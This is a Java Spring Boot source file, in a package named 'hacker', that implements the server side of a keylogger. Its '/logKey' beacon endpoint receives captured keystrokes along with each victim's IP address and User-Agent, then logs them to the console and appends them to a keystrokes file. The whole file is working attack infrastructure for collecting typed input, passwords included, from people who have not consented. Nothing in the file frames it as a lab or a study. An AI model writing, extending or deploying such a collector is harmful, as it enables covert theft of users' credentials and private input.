package com.example.hacker;

import jakarta.annotation.PostConstruct;
import jakarta.servlet.http.HttpServletRequest;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.time.LocalDateTime;

@RestController
public class KeyloggerController {

    private static final Path LOG_DIR  = Paths.get("logs");
    private static final Path LOG_FILE = LOG_DIR.resolve("keystrokes.txt");

    @PostConstruct
    public void init() throws IOException {
        if (!Files.exists(LOG_DIR)) {
            Files.createDirectories(LOG_DIR);
        }
        if (!Files.exists(LOG_FILE)) {
            Files.createFile(LOG_FILE);
        }
    }

    // Simple health endpoint (handy during testing)
    @GetMapping(value = "/health", produces = MediaType.TEXT_PLAIN_VALUE)
    public String health() {
        return "OK";
    }

    // Beacon endpoint: GET /logKey?key=X
    @GetMapping(value = "/logKey", produces = MediaType.TEXT_PLAIN_VALUE)
    public String logKey(@RequestParam("key") String key, HttpServletRequest request) {
        String ip = request.getRemoteAddr();
        String ua = request.getHeader("User-Agent");
        String line = String.format("%s\tip=%s\tkey=%s\tua=%s%n",
                LocalDateTime.now(), ip, key, ua);

        System.out.print(line); // console evidence

        try {
            Files.write(LOG_FILE, line.getBytes(StandardCharsets.UTF_8),
                    StandardOpenOption.APPEND);
        } catch (IOException e) {
            System.err.println("Failed to append to keystrokes log: " + e.getMessage());
        }
        return "logged";
    }
}
